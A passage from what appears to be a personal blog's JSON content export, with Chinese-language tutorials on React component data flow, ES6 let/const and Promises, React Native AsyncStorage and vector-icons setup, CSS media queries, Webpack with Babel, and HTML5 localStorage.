中，数据是沿着组件树从上到下单向流动的。拥有数据的组件并不一定负责显示该数据，它经常把自己拥有的数据作为一个子组件的属性传递给子组件，由子组件来显示它。 双向数据流实际上 React 并不存在双向数据流，这种双向数据流是认为创造出来的。如果，A组件 需要传递数据给 B组件，那么 B组件 应该成为 A组件 的子组件。如果，A, B组件 都要互相传递数据，那么它们之间应该有一个共同的父组件。 示例显示数字，通过 +，- 按钮来同步更新数字的值。 假设有两个不同的组件，A，B 12345678910export default class A extends Component &#123; render() &#123; &lt;div&gt; &lt;div&gt;&#123;this.props.number&#125;&lt;/div&gt; &lt;div&gt; &lt;button onClick=&#123;this.props.add&#125;&gt;+&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &#125;&#125; 12345678910export default class B extends Component &#123; render() &#123; &lt;div&gt; &lt;div&gt;&#123;this.props.number&#125;&lt;/div&gt; &lt;div&gt; &lt;button onClick=&#123;this.props.sub&#125;&gt;-&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &#125;&#125; 它们有一个共同的父组件 123456789101112131415161718192021222324252627export default class C extends Component &#123; constructor(props) &#123; super(props); this.state = &#123; number: 0, &#125;; &#125; render() &#123; &lt;div&gt; &lt;A number=&#123;this.state.number&#125; add=&#123;e =&gt; ( this.setState(&#123; number: this.state.number + 1 &#125;) )&#125; /&gt; &lt;B number=&#123;this.state.number&#125; sub=&#123;e =&gt; ( this.setState(&#123; number: this.state.number - 1 &#125;) )&#125; /&gt; &lt;/div&gt; &#125;&#125;","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"ES6 let，const，块级作用域","slug":"ECMAScript/ES6 let，const，块级作用域","date":"2017-01-29T09:49:39.000Z","updated":"2021-06-15T06:10:52.810Z","comments":true,"path":"/stories/2017/01/ECMAScript/ES6 let，const，块级作用域/","link":"","permalink":"http://me.lizhooh.com/stories/2017/01/ECMAScript/ES6 let，const，块级作用域/","excerpt":"let 与 块级作用域作用域是编程中的一个非常重要的概念。","text":"let 与 块级作用域作用域是编程中的一个非常重要的概念。 ES6 之前，javascript 只有全局作用域和函数作用域12345678// 函数作用域var foo = function() &#123; var a = 1; b = 2;&#125;;foo();console.log(a, b); // undefined, 2 很明显，a 只存在函数作用域中，b 存在全局作用域里。 而，在 Web 开发中，与作用域有着极大的关系的是：回调，循环绑定事件。 比如，你需要使用 settimeout，则必须去绑定其 this。 1234567891011121314var obj = &#123; name: '', setName: function() &#123; // 错误写法 settimeout(function() &#123; this.name = 'xiaoming'; &#125;, 1000); // 正确写法 settimeout((function() &#123; this.name = 'xiaoming'; &#125;).bind(this), 1000); &#125;&#125; 再比如，你要使用循环给10个元素，进行click事件的监听。 1234567891011121314151617var list = $('ul.list &gt; li');for(var i = 0; i &lt; list.length; i++) &#123; // 错误写法 list[i].on('click', function() &#123; // ... &#125;); // 正确写法 (function(i) &#123; // 需要利用闭包创造：块作用域 list[i].on('click', function() &#123; // ... &#125;); &#125;)(i);&#125;console.log(i); // i = 10 Javascript 没有块作用域？ 12345if(1 &gt; 0) &#123; var a = 1;console.log(a); // 1 事实证明，在 ES6 之前，javascript 并没有块作用域，这意味着许多，需要用到块作用域处理的问题都需要闭包来处理。而闭包的原理便是利用高阶函数产生能够穿透作用域的引用。 ES6 let 的到来ES6 新增加 let 关键字，可以说是 var 的优化版，官方推荐：如果你使用 ES6，则更多的使用 let 来代替 var。 let 与 var 的异同点 功能 let var 定义变量 √ √ 可被释放 √ √ 可被提升（Hoist） √ 重复定义检查 √ 可被用于块状作用域 √ 上面的绑定事件问题优化为： 123456789var list = $('ul.list &gt; li');for(let i = 0; i &lt; list.length; i++) &#123; // 正确 list[i].on('click', function() &#123; // ... &#125;);&#125;console.log(i); // i is undefined const在 ES6 之前，javascript 是没有定义常量的关键字的。而 ES6 则可以使用 const 定义常量。 12const a = 1;a = 2; // a = 1; const 的实现原理确实只限于创造一个不可变的内存绑定，而在某些情况下，并非值不可变。 123456789const obj = &#123; a: 1, b: 2,&#125;;obj.a = 3;console.log(obj.a); // 3obj = &#123; c: 3 &#125;; // obj = &#123;a: 3, b:2 &#125; 如果要实现一个值不可变的对象，那么就有使用 Object.freeze()","categories":[{"name":"ES6","slug":"ES6","permalink":"http://me.lizhooh.com/categories/ES6/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"ES6(ES2015)","slug":"ES6-ES2015","permalink":"http://me.lizhooh.com/tags/ES6-ES2015/"}]},{"title":"ES6 理解 Promise 对象","slug":"ECMAScript/ES6 理解 Promise 对象","date":"2017-01-21T05:25:39.000Z","updated":"2021-06-15T06:10:52.811Z","comments":true,"path":"/stories/2017/01/ECMAScript/ES6 理解 Promise 对象/","link":"","permalink":"http://me.lizhooh.com/stories/2017/01/ECMAScript/ES6 理解 Promise 对象/","excerpt":"Promise 对象Promise 对象是 CommonJS 工作组提出的一种规范，目的是为异步操作提供统一接口。 那么，什么是 Promises？ 首先，它是一个对象，也就是说与其他 JavaScript 对象的用法，没有什么两样；其次，它起到代理作用（proxy），充当异步操作与回调函数之间的中介。它使得异步操作具备同步操作的接口，使得程序具备正常的同步运行的流程，回调函数不必再一层层嵌套。 简单说，它的思想是，每一个异步任务立刻返回一个 Promise 对象，由于是立刻返回，所以可以采用同步操作的流程。这个 Promises 对象有一个 then 方法，允许指定回调函数，在异步任务完成后调用。 Promise 的目标是使用正常的程序流程（同步），来处理异步操作。","text":"Promise 对象Promise 对象是 CommonJS 工作组提出的一种规范，目的是为异步操作提供统一接口。 那么，什么是 Promises？ 首先，它是一个对象，也就是说与其他 JavaScript 对象的用法，没有什么两样；其次，它起到代理作用（proxy），充当异步操作与回调函数之间的中介。它使得异步操作具备同步操作的接口，使得程序具备正常的同步运行的流程，回调函数不必再一层层嵌套。 简单说，它的思想是，每一个异步任务立刻返回一个 Promise 对象，由于是立刻返回，所以可以采用同步操作的流程。这个 Promises 对象有一个 then 方法，允许指定回调函数，在异步任务完成后调用。 Promise 的目标是使用正常的程序流程（同步），来处理异步操作。 从上面代码可以看到，采用 Promises 接口以后，程序流程变得非常清楚，十分易读。 12345678910111213141516// 传统写法，典型的回调地狱step1(function (value1) &#123; step2(value1, function(value2) &#123; step3(value2, function(value3) &#123; step4(value3, function(value4) &#123; // ... &#125;); &#125;); &#125;);&#125;);// Promises的写法，还是异步执行(new Promise(step1)) .then(step2) .then(step3) .then(step4); Promise 接口Promise 接口的基本思想是，异步任务返回一个 Promise 对象。 Promise 对象只有三种状态 异步操作“未完成”（pending）异步操作“已完成”（resolved，又称fulfilled）异步操作“失败”（rejected） 三种的状态的变化途径只有两种 异步操作从“未完成”到“已完成”异步操作从“未完成”到“失败” Promise 对象的最终结果只有两种 异步操作成功，Promise 对象传回一个值，状态变为 resolved。异步操作失败，Promise 对象抛出一个错误，状态变为 rejected。 then 方法Promise 对象使用then方法添加回调函数。then 方法可以接受两个回调函数，第一个是异步操作成功时（变为 resolved 状态）时的回调函数，第二个是异步操作失败（变为 rejected ）时的回调函数（可以省略）。一旦状态改变，就调用相应的回调函数。 promise 的状态一旦变为 resolved，就依次调用后面每一个 then 指定的回调函数，每一步都必须等到前一步完成，才会执行。 12345promise .then(step1) .then(step2) .then(step3) .then(console.log, console.error); 假定 step1 操作失败，抛出一个错误，这时 step2 和 step3 都不会再执行了（因为它们是操作成功的回调函数，而不是操作失败的回调函数）。Promises 对象开始寻找，接下来第一个操作失败时的回调函数，在上面代码中是 console.error。Promises 对象的错误有传递性。 Promise 的应用Ajax 操作使用 Promise 对象。 12345678910111213141516171819202122232425function search(term) &#123; var url = 'http://example.com/search?q=' + term; var xhr = new XMLHttpRequest(); var result; return new Promise(function (resolve, reject) &#123; xhr.open('GET', url, true); xhr.onload = function (e) &#123; if (this.status === 200) &#123; result = JSON.parse(this.responseText); resolve(result); &#125; &#125;; xhr.onerror = function (e) &#123; reject(e); &#125;; xhr.send(); &#125;);&#125;search(\"Hello World\") .then(console.log, console.error); 总结Promise 对象的优点在于，让回调函数变成了规范的链式写法，程序流程可以看得很清楚。 它的一整套接口，可以实现许多强大的功能，比如为多个异步操作部署一个回调函数、为多个回调函数中抛出的错误统一指定处理方法等等。 而且，它还有一个前面三种方法都没有的好处：如果一个任务已经完成，再添加回调函数，该回调函数会立即执行。 所以，你不用担心是否错过了某个事件或信号。这种方法的缺点就是，编写和理解都相对比较难。 参考资料 http://javascript.ruanyifeng.com/","categories":[{"name":"ES6","slug":"ES6","permalink":"http://me.lizhooh.com/categories/ES6/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"ES6(ES2015)","slug":"ES6-ES2015","permalink":"http://me.lizhooh.com/tags/ES6-ES2015/"}]},{"title":"React Native 本地数据存储（一）","slug":"React Native/React Native 本地数据存储（一）","date":"2017-01-19T03:39:41.000Z","updated":"2021-06-15T06:10:52.864Z","comments":true,"path":"/stories/2017/01/React Native/React Native 本地数据存储（一）/","link":"","permalink":"http://me.lizhooh.com/stories/2017/01/React Native/React Native 本地数据存储（一）/","excerpt":"数据持久化数据持久化是指应用将某些数据存储在手机存储空间里。 React Native 提供一种本地存储的 API：AsyncStorage，它的使用方式非常类似 HTML5 的 localStorage。AsyncStorage 是以“字符串键值对”保存到存储空间中。 AsyncStorage不提供索引，排序等数据库中经常使用的功能。它只是一个简单的、异步的“键值对”存储系统。 AsyncStorage API提供的方法都会返回一个 Javascript 的 Promise 对象。 处理数据在回调函数里处理，因为它是异步机制的。","text":"数据持久化数据持久化是指应用将某些数据存储在手机存储空间里。 React Native 提供一种本地存储的 API：AsyncStorage，它的使用方式非常类似 HTML5 的 localStorage。AsyncStorage 是以“字符串键值对”保存到存储空间中。 AsyncStorage不提供索引，排序等数据库中经常使用的功能。它只是一个简单的、异步的“键值对”存储系统。 AsyncStorage API提供的方法都会返回一个 Javascript 的 Promise 对象。 处理数据在回调函数里处理，因为它是异步机制的。 存储数据AsyncStorage 提供简单的 API 对数据进行操作。 setItem使用 setItem 来存储数据。 语法 static object setItem(key, value, [callback]); 示例 1234AsyncStorage.setItem('name', 'xiaoming', (err) =&gt; &#123; if(err) return console.error(err); console.log('succeed');&#125;); multiSet使用 multiSet 来一次性存储等多个数据。 语法 static object multiSet(array, [callback]); 示例 1234567AsyncStorage.multiSet([ ['name1', 'xiaoming1'], ['name2', 'xiaoming2'],], (err) =&gt; &#123; if(err) return console.error(err); console.log('succeed');&#125;); 读取数据AsyncStorage 提供简单的 API 对数据进行操作。 getItem使用 getItem 来读取数据 语法 static object getItem(key, [callback]); 示例 12345AsyncStorage.getItem('name', (err, result) =&gt; &#123; if(err) return console.error(err); console.log(result);&#125;);// xiaoming getAllKeys使用 getAllKeys 来读取所有存储的 key 值。 语法 static object getAllKeys([callback]); 示例 1234567891011AsyncStorage.getAllKeys((err, keys) =&gt; &#123; if(err) return console.error(err); // keys is Array keys.map((index, item) =&gt; &#123; console.log(`kes index: $&#123;index&#125;, key value: $&#123;item&#125;`)); &#125;;&#125;);// key index: 0, key value:name// key index: 1, key value:name1// key index: 2, key value:name2 multiGet使用 multiGet 来一次性读取多个键对应的值。 语法 static object multiGet(array, [callback]); 示例 12345678910111213AsyncStorage.multiGet([ 'name1', 'name2',], (err, results) =&gt; &#123; if(err) return console.error(err); // results is double dimensional array results.map((item, index) =&gt; &#123; console.log(`$&#123;item[0]&#125;:$&#123;item[1]&#125;`); &#125;);&#125;);// name1:xiaoming1// name2:xiaoming2s 删除数据AsyncStorage 提供简单的 API 对数据进行操作。 removeItem使用 removeItem 来对数据进行删除。 语法 static object removeItem(key, [callback]); 示例 1234AsyncStorage.removeItem('name', (err) =&gt; &#123; if(err) return console.error(err); console.log('succeed');&#125;); clear使用 clear 来清除所有的数据。 语法 static object clear([callback]); 示例 1234AsyncStorage.clear((err) =&gt; &#123; if(err) return console.error(err); console.log('succeed');&#125;); multiRemove使用 multiRemove 来删除指定多个键及其对应的值。 语法 static object multiRemove(array, [callback]); 示例 1234567AsyncStorage.multiRemove([ 'name1', 'name2',], (err) =&gt; &#123; if(err) return console.error(err); console.log('succeed');&#125;) 修改数据对于修改数据，使用写入数据的操作，可以覆盖已经存在的数据。 官方提供了mergeItem 和 multiMerge 来实现修改数据，但是这两个方法现在还不更够跨平台。 语法 static object mergeItem(kes, value, [callback]);static object multiMerge(array, [callback]);","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"},{"name":"数据持久化","slug":"数据持久化","permalink":"http://me.lizhooh.com/tags/数据持久化/"}]},{"title":"React Native Vector-icons（图标库）的使用","slug":"React Native/React Native Vector-icons 的使用","date":"2017-01-15T01:34:17.000Z","updated":"2021-06-15T06:10:52.860Z","comments":true,"path":"/stories/2017/01/React Native/React Native Vector-icons 的使用/","link":"","permalink":"http://me.lizhooh.com/stories/2017/01/React Native/React Native Vector-icons 的使用/","excerpt":"● 学习笔记 图标库 Vector-icons（图标库）React Native Vector-icons 是一个出色的图标库。一个“图标”库，官方描述为 “3000 Customizable Icons for React Native with support for NavBar/TabBar/ToolbarAndroid, image source and full stying.”可见，这个库为我们提供了很多图标，如果你不想花费时间去设计一些图标，不妨使用这个库来替代。","text":"● 学习笔记 图标库 Vector-icons（图标库）React Native Vector-icons 是一个出色的图标库。一个“图标”库，官方描述为 “3000 Customizable Icons for React Native with support for NavBar/TabBar/ToolbarAndroid, image source and full stying.”可见，这个库为我们提供了很多图标，如果你不想花费时间去设计一些图标，不妨使用这个库来替代。 它支持的图标有： Entypo by Daniel Bruce (411 icons) EvilIcons by Alexander Madyankin &amp; Roman Shamin (v1.8.0, 70 icons) FontAwesome by Dave Gandy (v4.7.0, 675 icons) Foundation by ZURB, Inc. (v3.0, 283 icons) Ionicons by Ben Sperry (v3.0.0, 859 icons) MaterialIcons by Google, Inc. (v3.0.1, 932 icons) MaterialCommunityIcons by MaterialDesignIcons.com (v1.7.22, 1722 icons) Octicons by Github, Inc. (v5.0.1, 176 icons) Zocial by Sam Collins (v1.0, 100 icons) SimpleLineIcons by Sabbir &amp; Contributors (v2.4.1, 189 icons) 安装 安装 rnpmrnpm 是专门来管理 React Native 是包管理工具 1npm install -g rnpm 安装 react-native-vector-icons 1npm install --save react-native-vector-icons 环境配置下面只配置 Android，IOS请参考官方说明。 根据官方的说明进行配置 配置 Gradle打开在根目录下的android/app/build.gradle 文件，增加一句代码在 68 行，apply from: “../../node_modules/react-native/react.gradle”后添加： 1234567project.ext.vectoricons = [ // 默认加载全部图标，这里选择加载两种类型的图标 iconFontNames: [ 'MaterialIcons.ttf', 'EvilIcons.ttf' ]]// 增加这行代码apply from: \"../../node_modules/react-native-vector-icons/fonts.gradle\" 配置 Manually复制 Fonts （在 @react-native-vector-icons\\Fonts） 文件到 android/app/src/main/assets/fonts 编辑 android/settings.gradle 增加几行代码（+代码）： 1234rootProject.name = 'MyApp'include ':app'+ include ':react-native-vector-icons'+ project(':react-native-vector-icons').projectDir = new File(rootProject.projectDir, '../node_modules/react-native-vector-icons/android') 编辑 android/app/build.gradle 增加几行代码（+代码）： 12345678910apply plugin: 'com.android.application'android &#123; // ...&#125;dependencies &#123; compile fileTree(dir: 'libs', include: ['*.jar']) compile \"com.android.support:appcompat-v7:23.0.1\" compile \"com.facebook.react:react-native:+\" // From node_modules compile project(':react-native-vector-icons') // &lt;---- add&#125; 编辑 MainApplication.java (在 android/app/src/main/java/…) 增加几行代码（+代码）： 1234567891011package com.myapp;import com.oblador.vectoricons.VectorIconsPackage; // &lt;---- add //.... @Override protected List&lt;ReactPackage&gt; getPackages() &#123; return Arrays.&lt;ReactPackage&gt;asList( new MainReactPackage(), new VectorIconsPackage() // &lt;---- add ); &#125;&#125; 配置 rnpm应用 rnpm，使它产生链接，（要求 React Native &gt; 0.17） 1react-native link 使用在 React Native 中使用 引入123// 引入两个不同类型的 ICON 库import FontAwesome from 'react-native-vector-icons/FontAwesome';import Ionicons from 'react-native-vector-icons/Ionicons'; 简单使用其中，name 对应着，各大 icon 库的图标名注意：如果报错，import Vector-icons 模块不存在，可能是 Vector-icons 环境配置没配置好，或者是需要重新编译，或者是需要清理 node_modules 缓存。 12345&lt;Ionicons name=&#123;'ios-text'&#125; size=&#123;30&#125; color=&#123;color&#125; /&gt; 效果： 效果 属性 Prop Description Default name 图标的名称 None color 图标的颜色 white size 图标的大小 20 ICON Button用于创建左侧带有图标的按钮的便利组件。 12345678910111213141516171819202122import Icon from 'react-native-vector-icons/FontAwesome';const myButton = ( &lt;Icon.Button name=\"facebook\" backgroundColor=\"#3b5998\" onPress=&#123;this.loginWithFacebook&#125; &gt; Login with Facebook &lt;/Icon.Button&gt;);const customTextButton = ( &lt;Icon.Button name=\"facebook\" backgroundColor=\"#3b5998\" &gt; &lt;Text style=&#123;&#123;fontSize: 15&#125;&#125;&gt; Login with Facebook &lt;/Text&gt; &lt;/Icon.Button&gt;); ICON Button * 属性 Prop Description Default name 图标的名称 None color 图标的颜色 white size 图标的大小 20 iconStyle 图标的样式 {marginRight: 10} backgroundColor 图标的背景颜色 #007AFF borderRadius 图标的圆角值 5 onPress 图标的点击事件 None ToolbarAndroidICON 可以在 ToolbarAndroid 上使用 1234567891011121314151617181920212223242526import Icon from 'react-native-vector-icons/Ionicons';function ToolbarView(props) &#123; return ( &lt;Icon.ToolbarAndroid title=\"Home\" titleColor=\"white\" navIconName=\"md-arrow-back\" onIconClicked=&#123;props.navigator.pop&#125; actions=&#123;[ &#123; title: 'Settings', iconName: 'md-settings', iconSize: 30, show: 'always' &#125;, &#123; title: 'Follow me on Twitter' iconName: 'logo-twitter' iconColor: '#4099FF' show: 'ifRoom' &#125;, ]&#125; overflowIconName=\"md-more\" /&gt; );&#125; 更新在 React-Native v0.52 版本，vector-icons 无法使用问题。 1Error: While resolving module `react-native-vector-icons/MaterialIcons`, the Haste package `react-native-vector-icons` was found. 解决方法如下： 123\"scripts\": &#123; \"postinstall\": \"rm ./node_modules/react-native/local-cli/core/__fixtures__/files/package.json”&#125; 参考资料 https://github.com/oblador/react-native-vector-icons http://ionicframework.com/docs/v2/ionicons http://fontawesome.io/","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"应用 @media 来自适应","slug":"CSS/应用 @media 来自适应","date":"2017-01-14T10:18:43.000Z","updated":"2021-06-15T06:10:52.809Z","comments":true,"path":"/stories/2017/01/CSS/应用 @media 来自适应/","link":"","permalink":"http://me.lizhooh.com/stories/2017/01/CSS/应用 @media 来自适应/","excerpt":"@media 可以针对不同的屏幕尺寸设置不同的样式，特别是如果你需要设置设计响应式的页面，@media 是非常有用的。 兼容性 兼容性 语法123@media mediatype and|not|(media feature) &#123; // CSS-Code;&#125;","text":"@media 可以针对不同的屏幕尺寸设置不同的样式，特别是如果你需要设置设计响应式的页面，@media 是非常有用的。 兼容性 兼容性 语法123@media mediatype and|not|(media feature) &#123; // CSS-Code;&#125; 断点通过设置断点来进行响应式 桌面设备 pc 手机设备 phone 使用媒体查询在 768px 添加断点，当屏幕 (浏览器窗口) 小于 768px，每一列的宽度是 100%下面使用 sass 123456789101112131415/* For desktop: */@function setCol($n) &#123; @for $i from 1 through $n &#123; .col-#&#123;$i&#125; &#123; width: #&#123;$i / %n&#125;%; &#125; &#125;&#125;setCol(12);@media screen and (max-width: 768px) &#123; /* For mobile phones: */ [class*=\"col-\"] &#123; width: 100%; &#125;&#125; 多个断点通过设置多个断点来，响应不同的设备，注意尺寸的顺序下面使用 sass 123456789101112131415161718/* For desktop: */@function setCol($n) &#123; @for $i from 1 through $n &#123; .col-#&#123;$i&#125; &#123; width: #&#123;$i / %n&#125;%; &#125; &#125;&#125;setCol(12);@media screen and (max-width: 600px) &#123; /* For mobile phones: */ // ...&#125;@media screen and (max-width: 768px) &#123; /* For mobile phones: */ // ...&#125; 移动端优先因为 css 的解析是从上至下的，所以要为移动端优先只需要把 @media 放到 setCol 前面就行了。 常用的尺寸这是从 bootstrap 源码里找出来的 从上面我们可以看出有几个临界点的分辨率，那么我们就可以轻松的来写自己的自适应代码了 @media screen and (min-width: 768px){ // &gt;=768的设备（手机） }@media screen and (min-width: 992px){ // &gt;=992的设备（平板/笔记本）}@media screen and (min-width: 1200) { // &gt;=1200的设备（台式电脑） } 注意下顺序，如果你把@media (min-width: 768px)写在了下面那么很悲剧 @media screen and (min-width: 1200) { // &gt;=1200的设备（台式电脑） }@media screen and (min-width: 992px){ // &gt;=992的设备（平板/笔记本）}@media screen and (min-width: 768px){ // &gt;=768的设备（手机） } 因为如果是1440,由于1440&gt;768那么你的1200就会失效。所以我们用min-width时，小的放上面大的在下面，同理如果是用max-width那么就是大的在上面，小的在下面 @media screen and (max-width: 1199) { // &lt;=1199的设备（台式电脑） }@media screen and (max-width: 991px){ // &lt;=991的设备（平板/笔记本）}@media screen and (max-width: 767px){ // &lt;=768的设备（手机） }","categories":[{"name":"CSS","slug":"CSS","permalink":"http://me.lizhooh.com/categories/CSS/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"CSS","slug":"CSS","permalink":"http://me.lizhooh.com/tags/CSS/"}]},{"title":"Webpack 使用 ES6","slug":"Webpack/Webpack 使用 ES6","date":"2017-01-11T01:34:29.000Z","updated":"2021-06-15T06:10:52.902Z","comments":true,"path":"/stories/2017/01/Webpack/Webpack 使用 ES6/","link":"","permalink":"http://me.lizhooh.com/stories/2017/01/Webpack/Webpack 使用 ES6/","excerpt":"前言ES6 的语法真的是太好用了，所以现在很多时候都是写 ES6 进行开发，下面介绍 Webpack 上配置使用 ES6。 创建目录简单创建目录结构如下：12345678/app----/es6----|————main.js----|————Person.js----bundle.js----index.html----webpack.config.js----package.json es6 里面存放的是 ES6 风格的代码， main.js 是入口文件，bundle.js 是编译后生成的文件，这里假设它存在的，index.html 是首页， webpack.config.js 是 webpack 的配置文件，package.json 是 npm 的文件，可以使用 npm init 生成。","text":"前言ES6 的语法真的是太好用了，所以现在很多时候都是写 ES6 进行开发，下面介绍 Webpack 上配置使用 ES6。 创建目录简单创建目录结构如下：12345678/app----/es6----|————main.js----|————Person.js----bundle.js----index.html----webpack.config.js----package.json es6 里面存放的是 ES6 风格的代码， main.js 是入口文件，bundle.js 是编译后生成的文件，这里假设它存在的，index.html 是首页， webpack.config.js 是 webpack 的配置文件，package.json 是 npm 的文件，可以使用 npm init 生成。 安装 webpack首先还是要保证安装了 nodejs，然后通过 npm 安装即可：1npm install webpack -g 配置打开 webpack.config.js ，编辑如下： 123456789101112131415161718192021222324252627var path = require('path');// 这里是在写 Nodejs，因为 Webpack 会使用到 Nodejs 去编译文件// 所以，可以尽情的写 Nodejsmodule.exports = &#123; // 入口文件 entry: \"./es6/main.js\", // 编译输出的文件 output: &#123; path: __dirname, filename: \"bundle.js\" &#125;, module: &#123; // 依赖库 loaders: [&#123; // es6文件目录 test: path.join(__dirname, 'es6'), // 使用 babel 对 ES6 风格的代码进行转换 loader: 'babel-loader', // 使用 es2015 即 es6 query: &#123; presets: ['es2015'], &#125; &#125;], &#125;&#125; module.exports 导出的对象即是 webpack 的配置对象，其中： entry 是入口文件。 output 是输出文件，这里的 filename 给的是 bundle.js ，也就是当 webpack 运行完之后将生成一个 bundle.js 文件。 loaders 是使用到的所有加载器，在 gulp 里面我们都是使用的是 gulp 的一些插件比如 gulp-rename 、gulp-concat 等等，在 webpack 里面类似，使用的是各种 loaders。 这里使用了一个叫 babel-loader 的加载器，在使用 gulp 进行ES6开发里面有介绍过，我们都是使用 babel 对 ES6 风格的代码进行转换，所以在 query 里面同样使用了 es2015 转码规则。下面就安装这个加载器。 安装 loaders安装 babel-loader：1npm install babel-loader --save-dev 安装转码规则：1npm install babel-preset-es2015 --save-dev 至此准备工作已经做完了，下面可以编写代码了。 源代码/es6/main.js 1234import Person from './Person.js';let p = new Person('张三', 20);document.write(p.say()); /es6/Person.js 1234567891011class Person &#123; constructor(name, age) &#123; this.name = name; this.age = age; &#125; say() &#123; return `我是$&#123;this.name&#125;,我今年$&#123;this.age&#125;岁了。`; &#125;&#125;export default Person; 在这里就可以直接引用 bundle.js 了。index.html1234567891011&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- ... --&gt; &lt;script src=\"bundle.js\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 编译因为有 webpack.config.js 配置文件，所以只需要输入 webpack 就能运行， webpack 会自动去执行配置文件的内容：1webpack 对于大型项目，可能 webpack 会运行很久，所以可以添加一个进度条便于查看：1webpack --progress --colors 在 gulp 里，使用 watch 可以监视文件的变化，而在 webpack 里，只需加一个参数：1webpack --watch 所以，我们可以使用下面的命令运行：1webpack --progress --colors --watch 运行可以看到： 1我是张三, 我今年20岁了。 就是这么简单！","categories":[{"name":"Webpack","slug":"Webpack","permalink":"http://me.lizhooh.com/categories/Webpack/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"前端自动化","slug":"前端自动化","permalink":"http://me.lizhooh.com/tags/前端自动化/"},{"name":"Webpack","slug":"Webpack","permalink":"http://me.lizhooh.com/tags/Webpack/"}]},{"title":"HTML5 本地数据存储","slug":"HTML5/学习笔记/HTML5 本地存储","date":"2017-01-06T05:01:11.000Z","updated":"2021-06-15T06:10:52.822Z","comments":true,"path":"/stories/2017/01/HTML5/学习笔记/HTML5 本地存储/","link":"","permalink":"http://me.lizhooh.com/stories/2017/01/HTML5/学习笔记/HTML5 本地存储/","excerpt":"概述使用 HTML5 可以在本地存储用户的浏览数据。数据以 键/值 对存在, web网页的数据只允许该网页访问使用。 浏览器支持Internet Explorer 8+，Firefox，Opera，Chrome，和 Safari支持Web 存储注意: Internet Explorer 7 及更早IE版本不支持web 存储。","text":"概述使用 HTML5 可以在本地存储用户的浏览数据。数据以 键/值 对存在, web网页的数据只允许该网页访问使用。 浏览器支持Internet Explorer 8+，Firefox，Opera，Chrome，和 Safari支持Web 存储注意: Internet Explorer 7 及更早IE版本不支持web 存储。 存储方式HTML5支持两种存储方式： localStorage: 没有时间限制的数据存储 sessionStorage: 针对一个 session 的数据存储 localStorage 对象localStorage 对象存储的数据没有时间限制。第二天、第二周或下一年之后，数据依然可用。 sessionStorage 对象sessionStorage 方法针对一个 session 进行数据存储。当用户关闭浏览器窗口后，数据会被删除。 区别localStorage 与 sessionStorage 的声明周期不同。sessionStorage 会在浏览器关闭或用户清理缓存时生命结束，localStorage 只有在用户清理缓存时生命结束。 APIlocalStorage 与 sessionStorage 都是 storage 对象，它们的 API 一样。 setItem()setItem() 作为 Storage 接口的方法，接受一个键名和值作为参数，将会把键名添加到存储中，如果键名已存在，则更新其对应的值。 语法： storage.setItem(keyName, keyValue); 示例： 12345function populateStorage() &#123; localStorage.setItem('bgcolor', 'red'); localStorage.setItem('font', 'Helvetica'); localStorage.setItem('image', 'myCat.png');&#125; getItem()getItem() 作为 Storage 接口的方法，接受一个键名（key name）作为参数，并返回对应键名的值（key’s value）。 语法: var aValue = storage.getItem(keyName); 示例： 123var currentColor = localStorage.getItem('bgcolor');var currentFont = localStorage.getItem('font');var currentImage = localStorage.getItem('image'); key()key() 作为 Storage 接口的方法，接受一个数值 n 作为参数，返回存储对象第 n 个数据项的键名。 语法： var aKeyName = storage.key(key); 示例： 1234567function populateStorage() &#123; localStorage.setItem('bgcolor', 'yellow'); localStorage.setItem('font', 'Helvetica'); localStorage.setItem('image', 'cats.png'); localStorage.key(2); // 应该返回 'image'&#125; removeItem()Storage 接口的 removeItem() 方法，接受一个键名作为参数，会把该键名从存储中移除。 语法： storage.removeItem(keyName); 示例： 1234567function populateStorage() &#123; localStorage.setItem('bgcolor', 'red'); localStorage.setItem('font', 'Helvetica'); localStorage.setItem('image', 'myCat.png'); localStorage.removeItem('image');&#125; clear()clear() 是 Storage 接口的一个方法，调用它可以清空存储对象里所有的键值。 语法: storage.clear(); 示例：1localStorage.clear(); lengthlength 是 Storage 接口的只读属性，返回一个整数，表示存储在 Storage 对象里的数据项（data items）数量。 语法： var aLength = storage.length; 示例： 1234567function populateStorage() &#123; localStorage.setItem('bgcolor', 'yellow'); localStorage.setItem('font', 'Helvetica'); localStorage.setItem('image', 